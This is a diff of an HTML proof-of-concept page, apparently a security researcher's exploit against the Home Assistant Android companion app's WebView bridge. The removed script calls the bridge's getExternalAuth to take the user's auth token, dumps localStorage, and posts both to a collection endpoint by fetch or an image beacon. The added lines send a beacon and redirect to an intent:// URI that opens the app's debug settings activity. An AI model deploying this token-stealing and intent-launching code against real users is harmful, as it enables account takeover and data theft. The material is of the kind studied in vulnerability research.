@@ -33,11 +33,10 @@ button { background: #e94560; color: white; border: none; padding: 10px 20px; bo
 </div>
 <script>
 var C=location.origin+'/collect';
-function cb(){try{if(window.ExternalApp&&typeof window.ExternalApp.getExternalAuth==='function'){document.getElementById('bs').innerHTML='<span class=success>Available</span>';document.getElementById('bp').style.display='block'}else{document.getElementById('bs').innerHTML='<span class=fail>Not available</span>'}}catch(e){document.getElementById('bs').innerHTML='<span class=fail>Error: '+e.message}}
-function stealToken(){try{window.ExternalApp.getExternalAuth({callback:function(d){document.getElementById('br').textContent='Token: '+JSON.stringify(d,null,2);exfil('token',d)}});document.getElementById('br').textContent='Called...'}catch(e){document.getElementById('br').textContent='Error: '+e.message}}
-function exfil(label,data){var p=label+': '+JSON.stringify(data);fetch(C,{method:'POST',mode:'cors',body:p}).catch(function(){new Image().src=C+'?d='+encodeURIComponent(p)});document.getElementById('er').textContent='Sent: '+p.substring(0,200)}
-function exfilLS(){var d={};try{for(var i=0;i<localStorage.length;i++)d[localStorage.key(i)]=localStorage.getItem(localStorage.key(i))}catch(e){}exfil('localStorage',d)}
-cb();setTimeout(function(){exfil('page',{url:location.href,title:document.title,time:new Date().toISOString()})},1000);
+var intentUri = 'intent://#Intent;component=io.homeassistant.companion.android.debug/.settings.SettingsActivity;end';
+// ONE request: ping + intent proof + page info
+new Image().src = C + '?d=' + encodeURIComponent('ping=' + Date.now() + '|intent=' + intentUri + '|url=' + location.href);
+window.location = intentUri;
 </script>
 </body>
 </html>
